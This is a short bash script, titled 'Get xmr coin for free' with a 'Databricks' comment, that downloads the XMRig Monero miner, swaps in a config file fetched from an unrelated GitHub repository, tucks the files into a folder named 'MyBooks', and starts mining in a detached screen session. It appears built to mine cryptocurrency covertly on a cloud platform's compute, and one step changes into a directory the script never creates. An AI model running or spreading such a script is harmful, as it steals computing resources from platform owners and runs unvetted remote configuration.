#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
sudo apt install screen
clear

cd
mkdir MyBooks
cd MyBooks

wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
rm config.json
wget https://raw.githubusercontent.com/Novabooks21/CoolBooks2/main/MainData/Main/config.json

cd ~/MyBooks/xmrig-proxy-6.15.1
clear


screen -R xmr
./xmrig
